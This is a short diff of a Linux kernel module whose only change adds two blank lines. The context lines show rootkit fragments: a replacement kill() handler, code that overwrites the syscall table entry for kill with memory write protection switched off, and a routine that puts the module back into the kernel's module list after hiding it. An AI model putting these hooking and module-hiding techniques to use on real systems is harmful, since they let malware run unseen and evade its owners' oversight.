@@ -29,6 +29,7 @@ struct task_struct *find_task(pid_t pid)
     return NULL;
 }
 
+
 int new_kill(const struct pt_regs *pt_regs)
 {
     pid_t pid = (pid_t) pt_regs->di;
@@ -80,6 +81,7 @@ void hijack_kill(void) {
     printk(KERN_INFO "Hooked kill(), new kill @ %p", &syscall_table[__NR_kill]);
     protect_memory(old_cr0);
 }
+
 void module_show(void)
 {
     list_add(&THIS_MODULE->list, module_previous);
